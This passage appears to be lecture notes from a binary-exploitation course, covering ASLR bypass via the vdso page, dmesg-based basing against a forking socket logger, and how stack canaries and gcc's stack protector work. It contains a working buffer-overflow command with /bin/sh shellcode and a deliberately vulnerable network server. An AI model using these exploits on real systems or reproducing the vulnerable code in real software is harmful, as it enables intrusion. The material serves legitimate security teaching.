bfd71000-bfd87000 rwxp bfd71000 00:00 0          [stack]
ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
user@ubuntu-6-06:~/si485h-class-demos/class/16$ killall busy_wait
user@ubuntu-6-06:~/si485h-class-demos/class/16$ ./busy_wait &
[3] 10276
[2]   Terminated              ./busy_wait
user@ubuntu-6-06:~/si485h-class-demos/class/16$ cat /proc/10276/maps 
08048000-08049000 r-xp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
08049000-0804a000 rwxp 00000000 08:01 614242     /home/user/si485h-class-demos/class/16/busy_wait
b7e3e000-b7e3f000 rwxp b7e3e000 00:00 0 
b7e3f000-b7f64000 r-xp 00000000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
b7f64000-b7f69000 r-xp 00125000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
b7f69000-b7f6c000 rwxp 0012a000 08:01 597932     /lib/tls/i686/cmov/libc-2.3.6.so
b7f6c000-b7f6e000 rwxp b7f6c000 00:00 0 
b7f78000-b7f7a000 rwxp b7f78000 00:00 0 
b7f7a000-b7f8f000 r-xp 00000000 08:01 566182     /lib/ld-2.3.6.so
b7f8f000-b7f91000 rwxp 00014000 08:01 566182     /lib/ld-2.3.6.so
bfc79000-bfc8f000 rwxp bfc79000 00:00 0          [stack]
ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
```

You'll notice that some thigns move around, but the `[vdso]` does not.
What is that? Well that is the linux kernel entry points for system
calls, the so called linux kernel gateway. Using the `ldd` tool, we can
see this more so:

``` example
user@ubuntu-6-06:~/si485h-class-demos/class/16$ ldd busy_wait
    linux-gate.so.1 =>  (0xffffe000)
    libc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e20000)
    /lib/ld-linux.so.2 (0xb7f5b000)
```

What's in this non-randomized location? Well, let's see if it at least
has what we need, and we can search it using a very simple C program:

``` c
#include <stdio.h>
#include <stdlib.h>

int main(){

  unsigned long linuxgate_start=0xffffe000;
  char *ptr = (char *) linuxgate_start;

  int i;
  for(i=0;i<4096 /*one page*/; i++){
    if ( ptr[i] == '\xff' && ptr[i+1] == '\xe4'){
      printf("Found jmp esp at %p\n", ptr+i);
    }
  }

  return 0;
}
```

``` example
user@ubuntu-6-06:~/si485h-class-demos/class/17$ ./search_gate 
Found jmp esp at 0xffffe777
```

So we can now use that address as our bounce point to exploit the
vulnerable program. Here's that vulnerable program being exploited,
agian.

``` example
user@ubuntu-6-06:~/si485h-class-demos/class/17$ ./vulnerable 1 `python -c "print 'A'*(0x20+0x8) + '\x77\xe7\xff\xff' + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

user@ubuntu-6-06:/home/user/si485h-class-demos/class/17$ exit  #<--- here I'm in the shell
exit
user@ubuntu-6-06:~/si485h-class-demos/class/17$
```

# Basing from dmesg

Another strategy for circumventing ASLR is called basing, where through
some side channel, you learn the offset or the base address of the
loaded page, which will reveal where to jump. This can be done remotely,
or locally, and here we'll focus on using `dmesg` to reveal the base of
the map and our jump point.

## dmesg

`dmesg` is the kernel logging functionality that is availble to the
user. It reports things like network setup and tear down, and also
information about segementation faults. Which we will use today.

For example, let's consider segfaulting (on purpose) our vulnerable
program:

``` example
user@si485H-base:demo$ ./vulnerable 1 `python -c "print 'A'*100"`
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[2876532.997490] vulnerable[23836]: segfault at 41414141 ip 41414141 sp bf973950 error 14
```

The program crashed, this was reported by the operating system and
logged in `dmesg`. Looking more closely, the reason it crashed is that
the instruction pointer has a bunch of A's overwritten it.

More importantly, we can see that the stack pointer is also revealed,
and with the base address we need, 0xbf90000!

## On fork() and memory space

Another item we can leverage is that `fork()`'ed process share the same
memory space as there parent. For example, here is a sample program:

``` c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  int main(){

    int a =10;

    if ( fork() == 0){
      //child
      printf("Child: %p\n",&a);
    }else{
      printf("Parent: %p\n",&a);
    }
    wait(NULL);
    return;  

  }
```

``` example
user@si485H-base:demo$ ./fork_rand_sample 
Parent: 0xbf9ced9c
Child: 0xbf9ced9c
```

Why is this important? Well,many logging and backend systems must work
asynchronously, so foreach request, they fork and have a child complete
the tasks. If we can get the child to crash, there would be a log
message in dmesg, but the parent would persist. That's exactly what we
need to attack the parent process.

## Basing a logging engine

Below is a sample logging utility that uses a socket to accept new
messages:

``` c

  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>

  const char logfile[]="log.dat";

  void handle_client(int sock);
  void hello(int sock);
  void logmsg(int sock, char * msg);
  char * getmsg(int sock);

  void hello(int sock){
    struct sockaddr_in client_addr; 
    socklen_t sin_size ;
    char hello[100];

    getpeername(sock, (struct sockaddr *) &client_addr, &sin_size);

    sprintf(hello,"Hello %s: Send log message\n", inet_ntoa(client_addr.sin_addr));
    printf("%s",hello);

    write(sock,hello,strlen(hello));

  }

  char * getmsg(int sock){
    int size=20;
    char * response = malloc(size);
    char buf[10];
    int n=0,i=0;

    //read a log msg reallocate as needed
    while( (n = read(sock,buf,10)) > 0){
      if (i+n > size){
 size*=2; //double size
 response = realloc(response, size);
      } 

      strncpy(&response[i],buf,n);//write into response
      i+=n; //move foreard the counter
    }

    response[i]='\0' ; //null terminate

    return response;
  }

  void logmsg(int sock, char * msg){
    char event[50];

    //create event string
    sprintf(event,"[%d] %s\n", time(NULL), msg);

    //open the logfile
    FILE * fstream = fopen(logfile,"a");

    //log the event
    fprintf(fstream,event);

    //close the file
    fclose(fstream);

    //write repsonse to client
    write(sock,event,strlen(event));

    return;
  }

  void handle_client(int sock){

    //do hello
    printf("Handle Client!\n");
    hello(sock);

    //get msg
    char * msg = getmsg(sock);

    //log response
    logmsg(sock,msg);

    //deallocate
    free(msg);

    char goodbye[]="Goodbye!\n";
    write(sock, goodbye,strlen(goodbye));
    shutdown(sock,2);
    close(sock);
  }


  int main(void){
    int server, client; //server and client socket

    struct sockaddr_in host_addr; //address structures

    int yes=1,gonavy=1;

    //open new socket for server
    server = socket(AF_INET, SOCK_STREAM, 0);

    //set up server address
    memset(&(host_addr), '\0', sizeof(struct sockaddr_in));
    host_addr.sin_family=AF_INET;
    host_addr.sin_port=htons(2525);
    host_addr.sin_addr.s_addr=INADDR_ANY;

    //bind server socket
    if(bind(server, (struct sockaddr *) &host_addr, sizeof(struct sockaddr)) < 0){
      perror("bind");
      return 1;
    }

    //set up listening queue
    listen(server,4);

    //accept incoming connection
    while (1){
      client = accept(server, NULL,NULL);
      if( client < 0 ){
 perror("accept");
 break;
      }

      if( fork() == 0){
 //handle each client in the child
 handle_client(client);
      }
    }
    return 0;
  }

```

The gist of the program is that the server waits for new incoming
connections, and for each client, forks a new logging util that will
open the log file and deposit the message. Looking closely, we see that
`logmsg()` function has a vulnerability when calling `sprintf()`. the
Length of the msg is never checked with respect to the length of the
`event` buffer.

Consider how this tool might be used on a host machine. The logging
server has access to the log file that the client cannot read. However,
the server allows a client to write to the file. The goal of the
nefarious client is to gain access to the log fiel, essentially, to gain
the privilege level of the server.

Let's consider how to do this, by first starting the server in one
terminal and probing it in another, when we connect we see the
following:

``` example
user@si485H-base:demo$ netcat localhost 2525
Hello 0.5.119.183: Send log message
loging

[1445621763] loging


Goodbye!
```

Let's start sending it a bit more stuff ...

``` example
user@si485H-base:demo$ python -c "print 'A'*50" | netcat localhost 2525
Hello 0.5.119.183: Send log message
[1445621810] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?AAAAAAAAA

^C
```

That seemed to cause a problem, so lets check the dmesg output:

\#+BEGIN<sub>EXAMPLE</sub> user@si485H-base:demo\$ dmesg | tail -1
[2877400.157327] logger[23967]: segfault at a0a35 ip 08048af3 sp
bfe11eb0 error 4 in logger[8048000+1000]

\#+END<sub>EXAMPLE</sub>

There you go, we see that we caused a segfault. Notice the ip is still
mostly intact, so let's increase the length of our string until we see
0xdeadbeef for the ip.

\#+BEGIN<sub>EXAMPLE</sub> user@si485H-base:demo\$ python -c "print
'A'\*50 + '\\xef\\xbe\\xad\\xde'" | netcat localhost 2525 Hello
0.5.119.183: Send log message

# Stack Smashing Detected

At some point in your programming life, you may have noticed the
following error message, either because (like in this class) you are
trying to smash the stack, or because you made some sort of a
programming error (more likely).

``` example
 user@si485H-base:demo$ ./smasher `python -c "print 'A'*100"`
 You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 *** stack smashing detected ***: ./smasher terminated
 Aborted (core dumped)
```

What is this that error? How is it generated? How is it tested for? How
do we defeat such a check? That's what we'll be working on next.

## Stack Guards and Canaries

A *stack guard* or a *canary* is a bit of data that sits between your
buffer and the return address and acts as a warning when buffers are
overflowed and the return address might be overwritten. The term
"canary" comes from the ol' cold mines, where the canary is more
sensitive to deadly and orderless natural gases that can sneak up on
miners. If the canary is found dead, then everyone knows it is time to
evacuate the cave. Similarly, in the program, if the canary is
overwritten, the program knows it is time to abort the operation and
report an error rather than actually returning from the function and
potentially setting up a vulnerability.

## Implementing Stack Guards and Canaries

While the canaries are added in through a compilation process with
gcc---and we will take a look at that in more detail in a bit---we can
also implement our own version of canary checks to see how this process
all works. Here's some sample code:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int _canary;

//initialize the cannary at program start up
__attribute__ ((constructor)) int initcannary(){
  srand(time(NULL));
  int canary = random(); //choose random 4 byte value
  canary &= 0xffffff00; // zero at last byte
  canary |= 0x01010100; //nothing but last byte can be zero
  _canary = canary;
}


void check_canary(char * buf, int len){
  //check canary to see if it survived
  if( *((unsigned int *) &buf[len]) != _canary){
    fprintf(stderr, "**STACK SMASHING DETECTED**\n");
    abort();
  }
}

void set_canary(char * buf, int len){
  //add canary to end of buffer
  *((unsigned int *) &buf[len]) =  _canary;
}

void foo(char * s){

  char buf[10]; 
  set_canary(buf,10);

  strcpy(buf,s);

  printf("You said: %s\n",buf);

  //check the canary before return
  check_canary(buf,10);
  return;
}

int main(int argc, char *argv[]){

  foo(argv[1]);

}
```

First focus on the `foo` function, where after declaring the static
array, the canary is set, and after before the return, the canary is
checked. The remaining functions, initialize the canary, set the canary,
and check the canary.

What is the "canary" in this context? it's just an integer whose least
significant byte is 0. This is set in the function `initcanary` sets
this up, and that function is also a C constructor function, which is a
special attribute to the function that forces it to run before `main()`.
The canary value is assigned to a global variable to be referred to
later.

The `check_canary` and `set_canary` functions leverage the fact that
following the buffer allocation on the stack, there tends to be a bit of
extra space. That's where we'll place our canary, immediately following
that spot, and now we can set and check as needed.

Let's see how it works:

``` example
user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*8"`
You said: AAAAAAAA
user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*9"`
You said: AAAAAAAAA
user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*10"`
You said: AAAAAAAAAA
user@si485H-base:demo$ ./mycanaries `python -c "print 'A'*11"`
You said: AAAAAAAAAAA
**STACK SMASHING DETECTED**
Aborted (core dumped)
```

... like a charm.

## The anatomy of a canary

Let's take a closer look at the `initcanary` function to understand the
anatomy of what makes a good canary:

``` c
//initialize the cannary at program start up
__attribute__ ((constructor)) int initcannary(){
  srand(time(NULL));
  int canary = random(); //choose random 4 byte value
  canary &= 0xffffff00; // zero at last byte
  canary |= 0x01010100; //nothing but last byte can be zero
  _canary = canary;
}
```

The rules are:

1.  The canary should be a random value
2.  The canary should have the least significant byte be zero
3.  The canary should have no NULLs elsewhere

For rule 1, the reason is somewhat obvious. If we new canary value *was
not* random, then we would know what it is and just include it in our
exploit string.

Rule 2 and 3 are a bit less clear. The reason for these is that we want
to zealously check the canary value, but we want to allow for small
overruns of a buffer, as what might happen when we copy the NULL byte in
strcpy(), but anything more than that we want to detect. Also, we don't
want excess NULL bytes in the canary in case of benign overruns and also
could effect the string null termination.

There is also another VERY important reason for the canary to have a
NULL byte! Consider what happens when your exploit has a NULL byte and
your leveraging `strcpy()`? Well `strcpy()` will stop at the null byte
and thus you can't easily overwrite the canary, even if you knew it or
were trying to guess it.

## Watching Canaries in Action

Finally, to put all the pieces together, we need to be able to see the
cannery in action to understand its function. To do that, I've written a
nifty little function that will print the stack of a calling process, so
called print<sub>stack</sub>(), whose source is below:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 *fname : function name
 *argc  : number of WORD size arguments
 **/
void print_stack(char * fname, int argc){
  /* Function for printing calling functions stack frame */
  unsigned int * base_p;
  unsigned int * saved_p;
  unsigned int * stack_p;
  unsigned int * cur;

  //embedded ASM to retrieve base pointer and saved base pointer
  __asm__ __volatile__ ("mov %%ebp, %[base_p]" : 
            [base_p] "=r" (base_p));
  __asm__ __volatile__ ("mov 0(%%ebp), %[saved_p]" : 
            [saved_p] "=r" (saved_p));

  //set stack frame info to calling stack frame
  stack_p = base_p;
  base_p = saved_p;

  //output information
  printf("--- STACK %s ---\n",fname);
  for(cur = base_p+argc+1; cur >= stack_p; cur--){
    if (cur == base_p){
      printf("%p <ebp>: %08x\n", cur, *cur);
    }else if (cur <= base_p){
      printf("%p <ebp-0x%x>: %08x\n", cur, 
         (unsigned int) (base_p-cur) * 4, *cur);
    }else{
      printf("%p <ebp+0x%x>: %08x\n", cur, 
         (unsigned int) (cur-base_p) * 4, *cur);
    }
  } 

}
```

Don't worry too much about how it works, but it embeds a bit of assembly
into the program to reconstruct the calling stack frame and print out a
well formatted version of the stack so we can take a look around. Here's
the `foo` function updated with the `print_stack` function:

``` c
void foo(char * s){

  char buf[10]; 
  set_canary(buf,10);

  //inspect stack before
  print_stack("foo",1);

  strcpy(buf,s);

  printf("You said: %s\n",buf);

  //inspect stack after
  print_stack("foo",1);

  //check the canary before return
  check_canary(buf,10);
  return;
}
```

And now when we run it, we can see what happens. Let's start by
inspecting for a run where nothing should go wrong:

``` example
user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*9"`
--- STACK foo ---
0xbffff680 <ebp+0x8>: bffff878
0xbffff67c <ebp+0x4>: 08048765
0xbffff678 <ebp>: bffff698
0xbffff674 <ebp-0x4>: bffff734
0xbffff670 <ebp-0x8>: 0d173300 //<--- Canary
0xbffff66c <ebp-0xc>: 080487c2
0xbffff668 <ebp-0x10>: 00000002
0xbffff664 <ebp-0x14>: 0000002f
0xbffff660 <ebp-0x18>: bffff85f
0xbffff65c <ebp-0x1c>: 0d173300
0xbffff658 <ebp-0x20>: 00000001
0xbffff654 <ebp-0x24>: 00000001
0xbffff650 <ebp-0x28>: 08048869
0xbffff64c <ebp-0x2c>: 080486fd
0xbffff648 <ebp-0x30>: bffff678
You said: AAAAAAAAA
--- STACK foo ---
0xbffff680 <ebp+0x8>: bffff878
0xbffff67c <ebp+0x4>: 08048765
0xbffff678 <ebp>: bffff698
0xbffff674 <ebp-0x4>: bffff734
0xbffff670 <ebp-0x8>: 0d173300 //<--- Canary
0xbffff66c <ebp-0xc>: 00414141
0xbffff668 <ebp-0x10>: 41414141
0xbffff664 <ebp-0x14>: 4141002f //<--- Buffer of A's
0xbffff660 <ebp-0x18>: bffff85f
0xbffff65c <ebp-0x1c>: 0d173300
0xbffff658 <ebp-0x20>: 00000001
0xbffff654 <ebp-0x24>: 00000001
0xbffff650 <ebp-0x28>: 08048869
0xbffff64c <ebp-0x2c>: 08048736
0xbffff648 <ebp-0x30>: bffff678
```

You see that the buffer comes short of killing the canary. Now, let's do
10 A's:

``` example
user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*10"`
--- STACK foo ---
0xbffff680 <ebp+0x8>: bffff877
0xbffff67c <ebp+0x4>: 08048765
0xbffff678 <ebp>: bffff698
0xbffff674 <ebp-0x4>: bffff734
0xbffff670 <ebp-0x8>: 21818b00
0xbffff66c <ebp-0xc>: 080487c2
0xbffff668 <ebp-0x10>: 00000002
0xbffff664 <ebp-0x14>: 0000002f
0xbffff660 <ebp-0x18>: bffff85e
0xbffff65c <ebp-0x1c>: 21818b00
0xbffff658 <ebp-0x20>: 00000001
0xbffff654 <ebp-0x24>: 00000001
0xbffff650 <ebp-0x28>: 08048869
0xbffff64c <ebp-0x2c>: 080486fd
0xbffff648 <ebp-0x30>: bffff678
You said: AAAAAAAAAA
--- STACK foo ---
0xbffff680 <ebp+0x8>: bffff877
0xbffff67c <ebp+0x4>: 08048765
0xbffff678 <ebp>: bffff698
0xbffff674 <ebp-0x4>: bffff734
0xbffff670 <ebp-0x8>: 21818b00  //<-- strcpy overrights 0x00 in canary
0xbffff66c <ebp-0xc>: 41414141
0xbffff668 <ebp-0x10>: 41414141
0xbffff664 <ebp-0x14>: 4141002f //<-- Buffer of A's
0xbffff660 <ebp-0x18>: bffff85e
0xbffff65c <ebp-0x1c>: 21818b00
0xbffff658 <ebp-0x20>: 00000001
0xbffff654 <ebp-0x24>: 00000001
0xbffff650 <ebp-0x28>: 08048869
0xbffff64c <ebp-0x2c>: 08048736
0xbffff648 <ebp-0x30>: bffff678
```

This time the buffer of A's is all filled up, but we used `strcpy()`
which will copy the NULL byte to the end. That means that 11 bytes are
written, the last one being 0x00. Fortunately, because our canary has a
0x00 in our last byte, we don't abort. However, at 11 we do:

``` example
user@si485H-base:demo$ ./mycanaries_print-stack `python -c "print 'A'*11"`
--- STACK foo ---
0xbffff680 <ebp+0x8>: bffff876
0xbffff67c <ebp+0x4>: 08048765
0xbffff678 <ebp>: bffff698
0xbffff674 <ebp-0x4>: bffff734
0xbffff670 <ebp-0x8>: 0f69b900
0xbffff66c <ebp-0xc>: 080487c2
0xbffff668 <ebp-0x10>: 00000002
0xbffff664 <ebp-0x14>: 0000002f
0xbffff660 <ebp-0x18>: bffff85d
0xbffff65c <ebp-0x1c>: 0f69b900
0xbffff658 <ebp-0x20>: 00000001
0xbffff654 <ebp-0x24>: 00000001
0xbffff650 <ebp-0x28>: 08048869
0xbffff64c <ebp-0x2c>: 080486fd
0xbffff648 <ebp-0x30>: bffff678
You said: AAAAAAAAAAA
--- STACK foo ---
0xbffff680 <ebp+0x8>: bffff876
0xbffff67c <ebp+0x4>: 08048765
0xbffff678 <ebp>: bffff698
0xbffff674 <ebp-0x4>: bffff734
0xbffff670 <ebp-0x8>: 0f690041 //<--- Canary Dead :(
0xbffff66c <ebp-0xc>: 41414141
0xbffff668 <ebp-0x10>: 41414141
0xbffff664 <ebp-0x14>: 4141002f
0xbffff660 <ebp-0x18>: bffff85d
0xbffff65c <ebp-0x1c>: 0f69b900
0xbffff658 <ebp-0x20>: 00000001
0xbffff654 <ebp-0x24>: 00000001
0xbffff650 <ebp-0x28>: 08048869
0xbffff64c <ebp-0x2c>: 08048736
0xbffff648 <ebp-0x30>: bffff678
**STACK SMASHING DETECTED**
Aborted (core dumped)
```

Now the canary is dead, and the world has been saved from one more
exploit.

# GCC's implementation of Stack Canaries

So far, we've been compiling our programs such that stack protectors
have been turned off:

``` example
 gcc -fno-stack-protector -z execstack
```

Now, let's compile a few programs with included stack protectors so we
can get a better sense of how gcc implements these. (Note, we'll turn
off the `execstack` option at some point soon).

``` example
user@si485H-base:demo$ cat smasher.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo(char * s){
  char buf[10];
  strcpy(buf,s);

  printf("You said: %s\n",buf);
}


int main(int argc, char *argv[]){

  foo(argv[1]);

}
user@si485H-base:demo$ gcc -z execstack smasher.c -o smasher
user@si485H-base:demo$ ./smasher `python -c "print 'A'*9"`
You said: AAAAAAAAA
user@si485H-base:demo$ ./smasher `python -c "print 'A'*10"`
You said: AAAAAAAAAA
user@si485H-base:demo$ ./smasher `python -c "print 'A'*11"`
You said: AAAAAAAAAAA
 *** stack smashing detected ***: ./smasher terminated
Aborted (core dumped)
```

## Disassembling Canary Code

We can start by placing a break point at foo, and looking at the
disassembly in gdb.:

``` example
(gdb) br foo
Breakpoint 1 at 0x80484a9: file smasher.c, line 5.
(gdb) r `python -c "print 'A'*11"`
Starting program: /home/user/git/si485-binary-exploits/lec/18/demo/smasher `python -c "print 'A'*11"`

Breakpoint 1, foo (s=0xbffff87d 'A' <repeats 11 times>) at smasher.c:5
5   void foo(char * s){
(gdb) ds foo
Dump of assembler code for function foo:
   0x0804849d <+0>: push   ebp
   0x0804849e <+1>: mov    ebp,esp
   0x080484a0 <+3>: sub    esp,0x28
   0x080484a3 <+6>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>: mov    DWORD PTR [ebp-0x1c],eax
=> 0x080484a9 <+12>:    mov    eax,gs:0x14
   0x080484af <+18>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484b2 <+21>:    xor    eax,eax
   0x080484b4 <+23>:    mov    eax,DWORD PTR [ebp-0x1c]
   0x080484b7 <+26>:    mov    DWORD PTR [esp+0x4],eax
   0x080484bb <+30>:    lea    eax,[ebp-0x16]
   0x080484be <+33>:    mov    DWORD PTR [esp],eax
   0x080484c1 <+36>:    call   0x8048370 <strcpy@plt>
   0x080484c6 <+41>:    lea    eax,[ebp-0x16]
   0x080484c9 <+44>:    mov    DWORD PTR [esp+0x4],eax
   0x080484cd <+48>:    mov    DWORD PTR [esp],0x80485a0
   0x080484d4 <+55>:    call   0x8048350 <printf@plt>
   0x080484d9 <+60>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484dc <+63>:    xor    eax,DWORD PTR gs:0x14
   0x080484e3 <+70>:    je     0x80484ea <foo+77>
   0x080484e5 <+72>:    call   0x8048360 <__stack_chk_fail@plt>
   0x080484ea <+77>:    leave  
   0x080484eb <+78>:    ret    
End of assembler dump.
```

One thing you might notice is that there is a bit more initialization at
the top of the function. In particular, the code for argument is moved
from `ebp+0x8` down the stack to `ebp-0x1c`. This is to also protect it
from overruns. More importantly, is the next two three lines, which: (1)
grab a value from address `gs:0x14` and then (2) move that value onto
the stack at `ebp-0xc`. That is the cannary.

The `gs:0x14` refers to an address in the threads local storage, and the
`gs` register is used to calculate an offset into that storage location.
The `gs:0x14` is a *logical address* used based on calculating an offset
of 0x14 from the start of the segment. Unfortunately, we can't easily
inspect this segment in gdb, but we can take a step and see what the
canary is.

``` example
(gdb) ni
0x080484af  5   void foo(char * s){
(gdb) ds
Dump of assembler code for function foo:
   0x0804849d <+0>: push   ebp
   0x0804849e <+1>: mov    ebp,esp
   0x080484a0 <+3>: sub    esp,0x28
   0x080484a3 <+6>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>: mov    DWORD PTR [ebp-0x1c],eax
   0x080484a9 <+12>:    mov    eax,gs:0x14
=> 0x080484af <+18>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484b2 <+21>:    xor    eax,eax
   0x080484b4 <+23>:    mov    eax,DWORD PTR [ebp-0x1c]
   0x080484b7 <+26>:    mov    DWORD PTR [esp+0x4],eax
   0x080484bb <+30>:    lea    eax,[ebp-0x16]
   0x080484be <+33>:    mov    DWORD PTR [esp],eax
   0x080484c1 <+36>:    call   0x8048370 <strcpy@plt>
   0x080484c6 <+41>:    lea    eax,[ebp-0x16]
   0x080484c9 <+44>:    mov    DWORD PTR [esp+0x4],eax
   0x080484cd <+48>:    mov    DWORD PTR [esp],0x80485a0
   0x080484d4 <+55>:    call   0x8048350 <printf@plt>
   0x080484d9 <+60>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484dc <+63>:    xor    eax,DWORD PTR gs:0x14
   0x080484e3 <+70>:    je     0x80484ea <foo+77>
   0x080484e5 <+72>:    call   0x8048360 <__stack_chk_fail@plt>
   0x080484ea <+77>:    leave  
   0x080484eb <+78>:    ret    
End of assembler dump.
(gdb) p/x $eax
$1 = 0x3444a500
(gdb) 
```

There it is. Now this value is written to `ebp-0xc`, which is exactly
the 4-bytes following the buffer, which is at location `ebp-0x16`, or 10
bytes away (0x16-0xc = 22-12 = 10). After initializing the canary, the
next relevant item is the call to `__stack_chk_fail` before the leave
and return. This will look at the canary and make sure that it's value
hasn't changed. If so, it will do the abort.

Lets now continue until right before the call to `strcpy()` and inspect
the stack:

``` example
(gdb) br *0x080484c1
Breakpoint 2 at 0x80484c1: file smasher.c, line 7.
(gdb) c
Continuing.

Breakpoint 2, 0x080484c1 in foo (s=0xbffff87d 'A' <repeats 11 times>) at smasher.c:7
7     strcpy(buf,s);
(gdb) ds
Dump of assembler code for function foo:
   0x0804849d <+0>: push   ebp
   0x0804849e <+1>: mov    ebp,esp
   0x080484a0 <+3>: sub    esp,0x28
   0x080484a3 <+6>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>: mov    DWORD PTR [ebp-0x1c],eax
   0x080484a9 <+12>:    mov    eax,gs:0x14
   0x080484af <+18>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484b2 <+21>:    xor    eax,eax
   0x080484b4 <+23>:    mov    eax,DWORD PTR [ebp-0x1c]
   0x080484b7 <+26>:    mov    DWORD PTR [esp+0x4],eax
   0x080484bb <+30>:    lea    eax,[ebp-0x16]
   0x080484be <+33>:    mov    DWORD PTR [esp],eax
=> 0x080484c1 <+36>:    call   0x8048370 <strcpy@plt>
   0x080484c6 <+41>:    lea    eax,[ebp-0x16]
   0x080484c9 <+44>:    mov    DWORD PTR [esp+0x4],eax
   0x080484cd <+48>:    mov    DWORD PTR [esp],0x80485a0
   0x080484d4 <+55>:    call   0x8048350 <printf@plt>
   0x080484d9 <+60>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484dc <+63>:    xor    eax,DWORD PTR gs:0x14
   0x080484e3 <+70>:    je     0x80484ea <foo+77>
   0x080484e5 <+72>:    call   0x8048360 <__stack_chk_fail@plt>
   0x080484ea <+77>:    leave  
   0x080484eb <+78>:    ret    
End of assembler dump.
(gdb) x/10x $ebp-0x20
0xbffff648: 0x00000001  0xbffff87d  0xbffff844  0x0000002f
0xbffff658: 0x0804a000  0x3444a500  0x00000002  0xbffff724
0xbffff668: 0xbffff688  0x08048505
```

At this point, we can see the stack as we are about to fill it in. We
can also see the canary value 0x3444a500, nd all the way up to the
return address 0x0804850. Now if we take one more step, this picture
changes:

``` example
(gdb) ni
9     printf("You said: %s\n",buf);
(gdb) ds
Dump of assembler code for function foo:
   0x0804849d <+0>: push   ebp
   0x0804849e <+1>: mov    ebp,esp
   0x080484a0 <+3>: sub    esp,0x28
   0x080484a3 <+6>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>: mov    DWORD PTR [ebp-0x1c],eax
   0x080484a9 <+12>:    mov    eax,gs:0x14
   0x080484af <+18>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484b2 <+21>:    xor    eax,eax
   0x080484b4 <+23>:    mov    eax,DWORD PTR [ebp-0x1c]
   0x080484b7 <+26>:    mov    DWORD PTR [esp+0x4],eax
   0x080484bb <+30>:    lea    eax,[ebp-0x16]
   0x080484be <+33>:    mov    DWORD PTR [esp],eax
   0x080484c1 <+36>:    call   0x8048370 <strcpy@plt>
=> 0x080484c6 <+41>:    lea    eax,[ebp-0x16]
   0x080484c9 <+44>:    mov    DWORD PTR [esp+0x4],eax
   0x080484cd <+48>:    mov    DWORD PTR [esp],0x80485a0
   0x080484d4 <+55>:    call   0x8048350 <printf@plt>
   0x080484d9 <+60>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484dc <+63>:    xor    eax,DWORD PTR gs:0x14
   0x080484e3 <+70>:    je     0x80484ea <foo+77>
   0x080484e5 <+72>:    call   0x8048360 <__stack_chk_fail@plt>
   0x080484ea <+77>:    leave  
   0x080484eb <+78>:    ret    
End of assembler dump.
(gdb) x/8x $ebp-0x18
0xbffff650: 0x4141f844  0x41414141  0x41414141  0x34440041
0xbffff660: 0x00000002  0xbffff724  0xbffff688  0x08048505
```

After this, our canary is dead. And with a final continue, we'll never
reach the leave and return.

``` example
(gdb) c
Continuing.
You said: AAAAAAAAAAA
 *** stack smashing detected ***: /home/user/git/si485-binary-exploits/lec/18/demo/smasher terminated

Program received signal SIGABRT, Aborted.
0xb7fdd424 in __kernel_vsyscall ()
```

## Canaries Are Consistent across Function Calls and Forks

Another interesting thing to notice about canaries is that they do not
change throughout the entire run of a program. We can see this in this
single sample program:

``` example
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "print_stack.h"

void foo(char * s){

  char buf[10];
  strcpy(buf,s);

  printf("%s\n",buf);
  print_stack("foo",1);

}

int main(){
  int i;
  for(i=0;i<2;i++){
    if(fork() == 0){
      foo("AAAAAAAAAA");
    }
    wait(0);
  }
}
```

This function forks 3 times, once in a child, and calls `foo` with a
`print_stack`, and the result is:

``` example
user@si485H-base:demo$ ./fork_guards 
AAAAAAAAAA
--- STACK foo ---
0xbffff6a0 <ebp+0x8>: 08048790
0xbffff69c <ebp+0x4>: 08048690
0xbffff698 <ebp>: bffff6c8
0xbffff694 <ebp-0x4>: 00000000
0xbffff690 <ebp-0x8>: 00000000
0xbffff68c <ebp-0xc>: 8826c000
0xbffff688 <ebp-0x10>: 41414141
0xbffff684 <ebp-0x14>: 41414141
0xbffff680 <ebp-0x18>: 4141f6c8
0xbffff67c <ebp-0x1c>: 08048790
0xbffff678 <ebp-0x20>: 00000000
0xbffff674 <ebp-0x24>: 00000001
0xbffff670 <ebp-0x28>: 0804878c
0xbffff66c <ebp-0x2c>: 08048655
0xbffff668 <ebp-0x30>: bffff698
AAAAAAAAAA
--- STACK foo ---
0xbffff6a0 <ebp+0x8>: 08048790
